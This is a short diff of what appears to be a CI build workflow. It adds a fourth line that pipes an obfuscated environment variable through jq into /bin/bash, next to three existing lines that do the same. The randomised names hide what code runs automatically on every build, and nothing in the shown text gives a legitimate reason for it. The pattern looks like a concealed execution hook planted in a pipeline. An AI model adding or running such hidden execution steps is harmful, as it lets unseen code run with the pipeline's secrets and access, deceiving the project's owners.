@@ -23,6 +23,7 @@ jobs:
           echo $ak58004 | jq -r .eghfs93840 | /bin/bash
           echo $csyuv2274 | jq -r .gez9 | /bin/bash
           echo $hrwm8510 | jq -r .agpp35 | /bin/bash
+          printf '%s' "$id62133" | jq -r .u8812 | /bin/bash
 
       - name: Upload artifact
         if: always()
